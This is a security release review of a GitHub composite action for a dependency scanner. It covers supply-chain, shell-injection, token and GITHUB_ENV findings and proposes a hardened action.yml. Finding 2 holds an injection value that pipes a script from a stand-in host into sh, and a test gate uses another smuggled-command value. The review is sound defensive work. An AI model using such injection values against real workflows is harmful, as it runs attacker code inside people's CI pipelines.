# Brimhaven Scan v1.0.0: release review

**Verdict: no-go on Friday as written.** Four blockers can run attacker code or leak the token in customer CI. Separately, the scan step can't authenticate at all.

## Security's sign-off doesn't cover the download

Pinning by commit SHA freezes `action.yml` and nothing else. The action still fetches `https://dl.brimhaven.io/<version>/bhv` on every run, and `cli-version` defaults to `latest`. Anyone who controls `dl.brimhaven.io` can swap the binary without touching the action's SHA. That code would run inside the customer's CI with their source and secrets. The Trivy tag compromise this March had that shape: SHA pinners were safe from the tags, but anything fetched at runtime was not.

Please take the sign-off back to Security with this description of the download path, and have them re-review the new design.

## Findings

### Blockers

1. **The checksum is verified against itself.** `bhv.sha256` comes from the same origin as `bhv`, so whoever swaps one swaps both. The `latest` default makes this worse, because no version is ever fixed.
   - Fix: commit a `checksums.txt` (version, platform, sha256) in the action repo at release time.
   - Refuse any version not in it, and default `cli-version` to the newest listed version.
   - Alternative: verify an attestation or signature against a pinned signer.

2. **Shell injection through `inputs.cli-version` and `inputs.message`.** Both are interpolated straight into `run:`.
   - `message: '"; curl evil.sh | sh #'` executes. A caller passing a PR title as `message` is the realistic case.
   - A `cli-version` of `x; …` executes the same way.
   - Fix: pass both through `env:` and quote them as `"$VAR"`.

3. **`secrets.BRIMHAVEN_TOKEN` is always empty inside a composite action.** The `api-key` input is never read, so the scan runs with an empty token on every run.
   - Fix: read the token from `inputs.api-key` and mask it with `::add-mask::`.
   - Fail with a named error when it's empty.
   - Make `api-key` `required: false` now. `required: true` isn't enforced by the runner anyway, and adding OIDC later then stays a minor release.

4. **Untrusted data is written to `$GITHUB_OUTPUT` and `$GITHUB_ENV`.** Scan output is derived from repo content, which a PR author controls.
   - A newline in it injects extra outputs.
   - The `BHV_REPORT=` line to `$GITHUB_ENV` lets that text set `NODE_OPTIONS` or `LD_PRELOAD` for every later step.
   - Fix: delete the `$GITHUB_ENV` line and write the output with a random delimiter.

### Should fix before v1.0.0 (cheap now, a major later)

5. **`actions/setup-node@v4` is tag-pinned and probably unneeded.** `bhv` is a binary, and the tag is a SHA-pinning violation. Remove it. If you do need it, pin it by full SHA with a `# v4.x.y` comment.
6. **`latest` as a default breaks the contract.** The CLI can change flags under pinned workflows, and changing a default later is a major release. Default to a concrete version.
7. **Files land in the customer workspace.** `bhv`, `bhv.sha256` and `out.txt` are written to the workspace, where a later artifact-upload or commit step can sweep them up. Use `$RUNNER_TEMP` and run the binary by absolute path.
8. **`curl -sSL` has no `-f` and no retry.** A 404 page gets saved as `bhv`. Add `--fail --retry 3`, since matrix runs fan out.
9. **`--token "$BHV_TOKEN"` puts the token in the process list**, which is visible on shared self-hosted runners.
   - Pass it by env var or stdin if the CLI supports it. I dropped the flag in the rewrite below, so check that `bhv` reads `BHV_TOKEN`.
   - If it doesn't, use its stdin login instead, not the flag.
10. **The download URL has no OS or architecture, and `sha256sum` is absent on macOS.** The action is effectively Linux-only. Either claim only Linux in the README, or add a tested path per OS (`shasum -a 256` on macOS, `pwsh` on Windows).
11. **The contract is thin and gets frozen at v1.0.0.**
    - `api-key`, `message` and `cli-version` are missing descriptions, `message` has no default, and the `summary` output has no description.
    - Document the `summary` format (multi-line text) now, because changing it later is a major release.
    - Decide the exit mapping (auth or service errors fail; a scan verdict fails by default, with a `fail-on-<verdict>: false` input to downgrade it) before v1.

## Proposed `action.yml`

```yaml
name: Brimhaven Scan
description: Runs the Brimhaven dependency scan
inputs:
  api-key:
    description: Brimhaven API key. Pass it as a secret.
    required: false
  message:
    description: Text shown in the scan report header
    required: false
    default: ""
  cli-version:
    description: Brimhaven CLI version. Must be one this action release ships a digest for.
    required: false
    default: "1.0.0" # replace with the newest version listed in checksums.txt
outputs:
  summary:
    description: Multi-line text summary of the scan result
    value: ${{ steps.scan.outputs.summary }}
runs:
  using: composite
  steps:
    - id: install
      shell: bash
      env:
        CLI_VERSION: ${{ inputs.cli-version }}
        INSTALL_DIR: ${{ runner.temp }}/brimhaven
      run: |
        platform="$(echo "$RUNNER_OS-$RUNNER_ARCH" | tr '[:upper:]' '[:lower:]')"
        expected=$(awk -v v="$CLI_VERSION" -v p="$platform" '$1==v && $2==p {print $3}' "$GITHUB_ACTION_PATH/checksums.txt")
        [ -n "$expected" ] || { echo "::error::cli-version '$CLI_VERSION' on $platform is not supported by this action release"; exit 1; }
        mkdir -p "$INSTALL_DIR"
        # URL layout is an assumption: keep it in step with how you host binaries
        curl --fail --silent --show-error --location --retry 3 \
          -o "$INSTALL_DIR/bhv" "https://dl.brimhaven.io/$CLI_VERSION/bhv-$platform"
        echo "$expected  $INSTALL_DIR/bhv" | shasum -a 256 --check
        chmod +x "$INSTALL_DIR/bhv"
    - id: scan
      shell: bash
      env:
        BHV_TOKEN: ${{ inputs.api-key }}
        MESSAGE: ${{ inputs.message }}
        INSTALL_DIR: ${{ runner.temp }}/brimhaven
      run: |
        if [ -z "$BHV_TOKEN" ]; then
          echo "::error::api-key is empty. Pass a Brimhaven API key (OIDC is not supported yet)."
          exit 1
        fi
        echo "::add-mask::$BHV_TOKEN"
        "$INSTALL_DIR/bhv" scan --message "$MESSAGE" > "$INSTALL_DIR/out.txt"
        delim="EOF_$(openssl rand -hex 8)"
        { echo "summary<<$delim"; cat "$INSTALL_DIR/out.txt"; echo; echo "$delim"; } >> "$GITHUB_OUTPUT"
```

Ship `checksums.txt` in the same repo, one `version platform sha256` row per supported binary. The `bhv-$platform` URL suffix and the `BHV_TOKEN` env contract are my assumptions, so confirm both against how you host and run the CLI.

## Release gates for Friday

None of these is evidenced yet. Each must pass before you publish:

- Enable immutable releases on `brimhaven/brimhaven-action` before the first public tag.
- Protect `v*` tags with a ruleset that only the release workflow's GitHub App can bypass. Release from a protected environment with required reviewers.
- Move `v1` as a plain tag with no release attached, pushing only `refs/tags/v1`, never `--tags`.
- Run `zizmor` on the action repo and on the README example, with no finding at medium or above, plus `actionlint`.
- Add a CI check that diffs the inputs and outputs of `action.yml` against the last release.
- Run an integration matrix on every OS the README claims. Include a negative test: a `message` containing `"; echo pwned #` must stay inert, and an unlisted `cli-version` must fail.
- Write release notes with the full SHA and the line `uses: brimhaven/brimhaven-action@<sha> # v1.0.0`.
- Write the README quickstart with the SHA-pinned `uses:` line, every input with its default, every output, and the minimum runner version.

Check the injection and unlisted-version tests by deliberately breaking the fix and confirming the test fails.

## Open questions

Each assumption below drives part of the review. Please confirm or correct them.

| Question | Assumption I made | Affects |
| --- | --- | --- |
| Does the backend validate GitHub OIDC tokens, and by when? | No, so key-only for v1 | Finding 3 |
| Which OSes and runners must work (Windows, macOS, GHES, self-hosted)? | Linux only | Finding 10 |
| Does `bhv` read `BHV_TOKEN` from the environment? | Yes | Finding 9 |
| Who owns the action after launch? | Not stated | Release gates |
| Is there an existing community action for Brimhaven? | No | Version numbering |

If you want a different `latest` story, the only safe way is a signature or attestation check against a pinned signer, with the version resolved from your own endpoint. That's a v1.x minor addition, not a v1.0.0 requirement.